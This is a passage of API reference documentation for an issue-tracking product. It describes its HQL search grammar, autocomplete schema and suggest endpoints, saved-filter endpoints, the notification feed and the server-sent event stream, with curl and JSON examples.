  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{
  "query": "status = \"In Progress\" AND assignee = currentUser() ORDER BY priority DESC",
  "page": 0, "size": 50
}'
```

Each row in the paginated `content` reuses the full [`IssueResponse`](#issues) plus its owning project's identity (results are cross-project):

```json
{ "issue": { "id": "…", "number": 18, "key": "DEMO-18", … },
  "projectId": "…", "projectKey": "DEMO", "projectName": "Demo Project" }
```

**HQL grammar** — a boolean expression of `field OP value` comparisons:

- **Fields:** `status`, `assignee`, `reporter`, `type`, `priority`, `created`, `updated`, `due`, `parent`, `text`, `label` (alias `labels`), `component` (alias `components`), `fixVersion`, `affectsVersion`, `sprint` (alias `sprints`), `storyPoints` (alias `points`), plus any **custom field** by its `key` (e.g. `severity`). `/search/schema` advertises the fields your autocomplete should offer — that list is [capability-aware](#search-hql) and can be a **subset** of what actually resolves, so treat it as vocabulary, not as the definitive query surface. Field names are matched case-insensitively, so the all-lowercase `fixversion` / `affectsversion` spellings work too — `/search/schema` always advertises the camelCase name, exactly once per field. **That list is exhaustive: there is no `project` field**, so a query cannot be narrowed to one project — the scope is always all of your visible projects, and each result row names its owner (`projectId` / `projectKey` / `projectName`) instead.
- **Operators:** `=` `!=` `IN` `~` `>` `<` `>=` `<=`. Which operators a field accepts is per-field (see `/search/schema`): `~` is a case-insensitive substring match, only on `text` (title + description); ordered comparisons (`>` `<` `>=` `<=`) apply to the date fields and to `priority`.
- **Booleans:** combine terms with `AND`, `OR`, `NOT` and parentheses `( )`. Precedence is `NOT` > `AND` > `OR`.
- **Emptiness:** `field IS [NOT] EMPTY` for nullable fields (`assignee`, `parent`, `due`, `label`, `component`, `fixVersion`, `affectsVersion`, `sprint`, `storyPoints`, and every custom field except CHECKBOX).
- **Sorting:** an optional trailing `ORDER BY field [ASC|DESC], …` clause — it must come last. Custom fields are **not sortable** (yet).
- **Functions:** `currentUser()`, `now()`, `startOfWeek()` (evaluated in server UTC).
- **Values:** status / type / priority are given by **name** (quote names with spaces, e.g. `"In Progress"`); users by email, display name, `currentUser()`, or UUID; dates as `YYYY-MM-DD`.
- **Labels:** `label` (alias `labels`) is many-valued and given by **name** — operators `= != IN` plus `IS [NOT] EMPTY`; it is **not sortable** (an issue has a *set* of labels, so `ORDER BY label` is a `422`). `label = "needs-design"` means "carries it", `label != "needs-design"` means "does not carry it" (issues with no labels at all included), and `label IS EMPTY` means "carries no label". Archived labels are excluded from name resolution, so a name that no longer exists in the workspace fails with `422` when the query runs — including for a stored [saved filter](#saved-filters).
- **Components:** `component` (alias `components`) is single-valued and given by **name** — operators `= != IN` plus `IS [NOT] EMPTY` — and, unlike `label`, it **is sortable** (`ORDER BY component` orders by component name and keeps issues that have none). Names resolve across your visible **projects**, so `component = Billing` matches the "Billing" of every project you can see. `component IS EMPTY` means "has no component". Archived components are excluded from name resolution (a name that only an archived component holds is a `422` at run time), even though issues keep carrying them.
- **Versions:** `fixVersion` ("ships in") and `affectsVersion` ("broken in") are two fields over the same link table, told apart by the role. Both are many-valued and given by **name** — operators `= != IN` plus `IS [NOT] EMPTY` — and, like `label`, **not sortable** (an issue has a *set* of versions, so `ORDER BY fixVersion` is a `422`). `fixVersion = "2.4.0"` means "ships in 2.4.0", `fixVersion != "2.4.0"` means "does not" (issues with no fix version at all included), and `fixVersion IS EMPTY` means "not scheduled for any release" — the unassigned-work query. An affects link never satisfies a `fixVersion` term and vice versa. Names resolve across your visible **projects**, so `fixVersion = "2.4.0"` matches the "2.4.0" of every project you can see. Archived versions are excluded from name resolution (a `422` at run time), even though issues keep carrying them.
- **Sprints:** `sprint` (alias `sprints`) is single-valued and given by **name** — operators `= != IN` plus `IS [NOT] EMPTY` — and, like `label`, **not sortable** (`ORDER BY sprint` is a `422`: sprint order across several projects has no common meaning). `sprint IS EMPTY` means "in no sprint", i.e. the backlog. Names resolve across your visible **projects**, so `sprint = "Sprint 7"` matches the "Sprint 7" of every project you can see. **Completed** sprints are excluded from name resolution — years of history would flood the namespace — though issues carrying them still match by id.
- **Story points:** `storyPoints` (alias `points`) is a native numeric field, so it takes ordered comparisons directly (`= != > < >= <=`) and **is sortable** — `ORDER BY storyPoints DESC` is the "show me the big ones first" query. `storyPoints IS EMPTY` means **unestimated**, which is deliberately not the same statement as `storyPoints = 0`. The operand is held to the field's own domain — the same `0`–`999` with at most 2 decimals that writing an estimate allows — so `storyPoints > 1e999` or `storyPoints = 1.234` comes back as the usual `422` semantic error naming the field, not a `500`. A comparison that could never match a row is rejected up front rather than passed to the database. Example: `sprint = "Sprint 7" AND storyPoints >= 5`.
- **Custom fields:** queried by `key`, with operators per type — TEXT / TEXTAREA / URL: `= != ~`; NUMBER / DATE: `= != > < >= <=`; SELECT: `= != IN`; MULTI_SELECT: `=` (contains) / `IN` (any-of); USER: `= != IN` + `currentUser()`; CHECKBOX: `=`. All support `IS [NOT] EMPTY` except CHECKBOX. SELECT/MULTI_SELECT values are given by option **label or id**; USER values by email / display name / `currentUser()` / UUID; DATE as `YYYY-MM-DD`. Example: `severity = "High" AND environment = prod`.
- **Retired field keys:** `story_points` — the custom-field key that release 0.13.0 archived when story points became a native field — still resolves, as a permanent alias for `storyPoints`, so a [saved filter](#saved-filters) written against the old key keeps running unchanged (no migration ever rewrites the stored text of a filter). Two observable details: a workspace that owns **its own** custom field keyed `story_points` still wins — the alias is a last-resort fallback consulted only after system fields and your visible custom fields, so it can never shadow a field of yours — and once the alias has been applied, errors name the **canonical** field: `story_points IN (5)` answers `422 "The IN operator is not allowed on field 'storyPoints'"`. Aliases are compatibility, not vocabulary: they are never advertised by `/search/schema`.

More examples: `type = Bug AND priority >= High AND due IS NOT EMPTY` · `assignee IS EMPTY AND created >= startOfWeek()` · `text ~ "flux capacitor" OR parent = "DEMO-12"`.

**Invalid queries** return `422` with a machine-readable anchor so a UI can underline the problem:

- a **parse error** carries `"errorType": "PARSE_ERROR"` with `position` (0-based character offset), `length`, and (when known) the offending `token`;
- a **semantic error** (e.g. unknown field, illegal operator, a non-sortable field in `ORDER BY`) carries `"errorType": "SEMANTIC_ERROR"` with the offending `field` and `position`.

```json
{ "type": "about:blank", "title": "Unprocessable Content", "status": 422,
  "detail": "Unknown field 'asignee' — did you mean 'assignee'?",
  "errorType": "SEMANTIC_ERROR", "field": "asignee", "position": 0 }
```

**Suggestions are capability-aware; resolution is not.** A project's [delivery capabilities](#delivery-capabilities) narrow what the two autocomplete endpoints *offer*, and nothing else:

- `/search/schema` lists `sprint`, `fixVersion`, `affectsVersion` and `storyPoints` only when **at least one** of your visible projects has the matching capability on (`board: SCRUM`, `releases`, `estimation` respectively). Every other field is listed always. In a workspace whose only visible project is `board: KANBAN`, `releases: false`, `estimation: false`, `fields` comes back as exactly `status` `type` `priority` `assignee` `reporter` `parent` `text` `created` `updated` `due` `label` `component` — plus your custom fields — with the four capability-gated names absent.
- The `SPRINT` and `VERSION` picklists carry names only from the visible projects that have the capability **on** (they were already scoped to your visible projects; this is one predicate more). With every capability off, both come back empty.
- `/search/suggest?field=fixVersion` and `?field=affectsVersion` are scoped the same way — that endpoint is the overflow of the same `VERSION` picklist, so it could not honestly answer differently. `label`, `component` and the user-valued fields are unaffected.

**Hidden fields still resolve — this is a guarantee, not an implementation detail.** A field omitted from `/search/schema` still **parses, compiles and runs**, whether you typed it by hand or loaded it from a [saved filter](#saved-filters). On that same all-capabilities-off project, `sprint = "Smoke Sprint"` returns `200` with its rows, while `sprint = "No Such Sprint"` returns the ordinary field-anchored `422` — exactly the two answers you would get with sprints on. No capability ever changes a status code ([capabilities gate the UI, never the API](#delivery-capabilities)); a colleague flipping a project toggle must never break your saved filter.

The asymmetry that follows is deliberate, and integrations need to expect it: **the suggested set is no longer the same as the resolvable set.** Because capabilities never delete or block data, a Kanban project may legitimately own sprints and a `releases: false` project may legitimately own versions; those names vanish from suggestions while still matching in queries. Do not use `/search/schema` as a validator for a query you are about to send — the query endpoint is the only authority on what resolves.

**Schema** — `GET /search/schema` drives autocomplete: `fields` describes each queryable field (`name`, data-type `type`, allowed `operators`, `nullable`, `sortable`, `valueSuggest`, `functions`) — the system fields first, then your visible **custom fields** (`name` = the field `key`, `type` = its custom `FieldType`) — `keywords` lists the HQL keywords, and `values` holds the small picklists (`STATUS`/`TYPE`/`PRIORITY`) of names reachable by your visible projects, a `LABEL` picklist of the workspace's non-archived label names, a `COMPONENT` picklist of the non-archived component names of those visible projects, a `VERSION` picklist of the non-archived version names of those projects **that have `releases` on** (**one** picklist serves both `fixVersion` and `affectsVersion` — the two roles draw from the same catalog, so both fields declare `valueSuggest: "VERSION"`), a `SPRINT` picklist of the **open** (non-completed) sprint names of those projects **that have `board: SCRUM`**, plus a `CUSTOM:<key>` entry per SELECT/MULTI_SELECT custom field (options as `{label, value=optionId}`). The `LABEL`, `COMPONENT`, `VERSION` and `SPRINT` picklists are **capped at 200 entries** each — a workspace can accumulate far more, so fall back to `/search/suggest?field=label` / `?field=component` / `?field=fixVersion` beyond that. **`sprint` is the exception: it has no `/search/suggest` fallback** (`?field=sprint` returns the usual `422`), because a project's open sprints are already bounded and cannot realistically overflow the picklist. `storyPoints` has no picklist at all — it is numeric. The member list (including USER custom fields) is deliberately **not** embedded — use `/search/suggest` for it. The system-field half of `fields`, and the `SPRINT` / `VERSION` picklists, are **capability-aware** (above): a field or a name that is missing here is still perfectly queryable.

The response also carries an **`insights`** block — `{measures, dimensions}` — listing what the [Insights panel](#insights--break-down-the-query-in-the-search-box) is worth being offered on this page. It is narrowed on exactly the same terms: `SPRINT` appears among the dimensions only when at least one visible project has `board: SCRUM`, and `POINTS` among the measures only when at least one has `estimation` on, mirroring the `sprint` and `storyPoints` fields above. One list serves both `slice` and `segment` (grouping is symmetric; the only rule is that the two must differ). And it is suggestion-only in the same way: **a dimension omitted here still resolves if the panel asks for it**, so a saved panel state cannot break because a curator flipped a project toggle.

```json
{
  "fields": [
    { "name": "status", "type": "ENUM_REF", "operators": ["=", "!=", "IN"],
      "nullable": false, "sortable": true, "valueSuggest": "STATUS", "functions": [] },
    { "name": "assignee", "type": "USER_REF", "operators": ["=", "!=", "IN", "IS EMPTY", "IS NOT EMPTY"],
      "nullable": true, "sortable": true, "valueSuggest": "USER", "functions": ["currentUser()"] },
    { "name": "severity", "type": "SELECT", "operators": ["=", "!=", "IN", "IS EMPTY", "IS NOT EMPTY"],
      "nullable": true, "sortable": false, "valueSuggest": "CUSTOM:severity", "functions": [] }
  ],
  "keywords": ["AND", "OR", "NOT", "IN", "IS", "EMPTY", "ORDER BY", "ASC", "DESC"],
  "values": {
    "STATUS": [ { "label": "In Progress", "value": null } ], "TYPE": [ … ], "PRIORITY": [ … ],
    "CUSTOM:severity": [ { "label": "High", "value": "opt-1" } ]
  }
}
```

**Suggest** — `GET /search/suggest?field=assignee&q=ada` returns up to 20 matching members (`q` is a prefix, max 100 chars); `field` may be `assignee`, `reporter`, or a USER-typed custom field. Each suggestion's `value` (the member email) is what you drop into the query:

```json
{ "field": "assignee",
  "suggestions": [ { "label": "Ada Lovelace", "value": "ada@example.com" } ] }
```

The same endpoint serves **labels** — `field=label` (or `labels`) returns up to 20 non-archived label names whose name *contains* `q` (case-insensitive; `label` and `value` are both the name). `%` and `_` in `q` are matched as literal characters, not wildcards:

```json
{ "field": "label",
  "suggestions": [ { "label": "needs-design", "value": "needs-design" } ] }
```

…and **components** — `field=component` (or `components`) behaves identically, over the non-archived component names of the projects you can see (names are de-duplicated case-insensitively, so a "Billing" owned by two projects is offered once):

```json
{ "field": "component",
  "suggestions": [ { "label": "Billing", "value": "Billing" } ] }
```

…and **versions** — `field=fixVersion` or `field=affectsVersion`, over the non-archived version names of the projects you can see **that have `releases` on** (the same capability scoping the `VERSION` picklist applies, since this endpoint is that picklist's overflow; a version whose project has releases off is still perfectly queryable by name; with no releases-on project you simply get an empty `suggestions` list and a `200`, never an error). Both roles share one catalog, so the two field names return identical suggestions (names are de-duplicated case-insensitively, so a "2.4.0" shipped by two projects is offered once):

```json
{ "field": "fixVersion",
  "suggestions": [ { "label": "2.4.0", "value": "2.4.0" } ] }
```

**`sprint` is intentionally not served here.** Its `/search/schema` `SPRINT` picklist is already bounded by the per-project open-sprint cap, so no typeahead was wired — `?field=sprint` returns the same `422` any other non-suggestable field returns. `storyPoints` is numeric and has no picklist either.

## Saved filters

Reusable, workspace-scoped [HQL](#search-hql) data sources. Every user can save their own filters and optionally **share** them read-only with the rest of the workspace. All endpoints require workspace membership and return **`404` (never `403`)** for a non-member, for a private filter owned by someone else, or when a non-owner tries to read/edit/delete a filter that isn't theirs — existence is never leaked.

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/workspaces/{wsId}/filters` | member | List your own filters plus every shared filter in the workspace |
| `POST` | `/workspaces/{wsId}/filters` | member | Create a filter (you become the owner) |
| `GET` | `/workspaces/{wsId}/filters/{filterId}` | member | Get one filter (your own or a shared one) |
| `PATCH` | `/workspaces/{wsId}/filters/{filterId}` | owner | Partial update — only the fields you send are applied |
| `GET` | `/workspaces/{wsId}/filters/{filterId}/usage` | owner | Where the filter is used (delete-warning hook) |
| `DELETE` | `/workspaces/{wsId}/filters/{filterId}` | owner | Delete the filter |

**Owner vs shared** — a filter with `"shared": true` is visible read-only to every other workspace member (it appears in their `GET /filters` list and they can fetch it by id). Only the **owner** may `PATCH`, `DELETE`, or read its `usage` — a non-owner attempting any of those gets `404`, even for a shared filter.

**Create** — the body is `{"name", "hql?", "shared?"}`:

- `name` is required, non-blank, max 120 chars, and **unique per (workspace, owner)** — a duplicate returns `409`. Different owners may reuse a name.
- `hql` is the HQL string to store (max 2000 chars; may be empty = "all issues"). It is **validated at save time** (parse + structural checks against the field schema) but never executed here — value resolution (`currentUser()`, status-name→id, …) is deferred to run time, so a later-archived catalog row won't permanently break a saved query. An invalid query returns `422` with the same anchor shape as [search](#search-hql) (`errorType` `PARSE_ERROR`/`SEMANTIC_ERROR` plus `position`/`length`/`token`/`field`).
- `shared` defaults to `false`.

```bash
curl -X POST $BASE/workspaces/$WS/filters \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{
  "name": "My open bugs",
  "hql": "type = Bug AND assignee = currentUser() AND status != Done",
  "shared": false
}'
```

The response (also returned by `GET` and `PATCH`) is a `SavedFilterResponse`. `mine` is relative to the caller (`true` when you own it) — the UI uses it to show edit/delete only on your own rows:

```json
{ "id": "…", "name": "My open bugs",
  "hql": "type = Bug AND assignee = currentUser() AND status != Done",
  "shared": false, "ownerId": "…", "ownerName": "Ada Lovelace", "mine": true,
  "createdAt": "2026-08-12T10:00:00Z", "updatedAt": "2026-08-12T10:00:00Z" }
```

**Update** — `PATCH` takes `{"name?", "hql?", "shared?"}`; every field is optional and a `null`/omitted field is a no-op. A changed `name` is re-checked for `(workspace, owner)` uniqueness (`409` on a dup, `400` if blank); a changed `hql` is re-validated (`422` on a bad query). Only the owner may update — a non-owner gets `404`.

**Usage** — `GET …/usage` is a forward-looking delete-warning hook so clients can show a "Used by N places — delete anyway?" confirmation. In the current release nothing consumes a saved filter yet, so `usages` is **always empty**:

```json
{ "usages": [] }
```

When boards/reports start consuming filters, each entry will be `{ "type": "BOARD"|"REPORT", "id": "…", "name": "…" }` with no contract change.

## Notifications

The signed-in user's notification feed across all their workspaces (assignments, mentions, …).

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/notifications` | ✔ | List, newest first |
| `GET` | `/notifications/unread-count` | ✔ | `{"count": 3}` |
| `POST` | `/notifications/{id}/read` | ✔ | Mark one as read |
| `POST` | `/notifications/read-all` | ✔ | Mark all as read. `204` |

```json
{ "id": "…", "type": "ISSUE_ASSIGNED", "title": "You were assigned DEMO-18",
  "body": "Rate-limit authentication endpoints", "link": "/w/…/p/…?issue=18",
  "read": false, "createdAt": "…" }
```

## Real-time events (SSE)

Subscribe to a workspace's live event stream over [Server-Sent Events](https://developer.mozilla.org/docs/Web/API/Server-sent_events):

```
GET /workspaces/{wsId}/sse
Accept: text/event-stream
Authorization: Bearer <accessToken>
```

Event names: `ISSUE_CREATED`, `ISSUE_UPDATED`, `ISSUE_DELETED` (data: `{"projectId", "issueNumber"}`) and `NOTIFICATION`. The stream is workspace-scoped and requires membership; reconnect with standard `EventSource` retry semantics.

---

*This reference will grow with the product. Found a mismatch between docs and behavior? Please [open an issue](https://github.com/Zherikhov/easyTask/issues).*
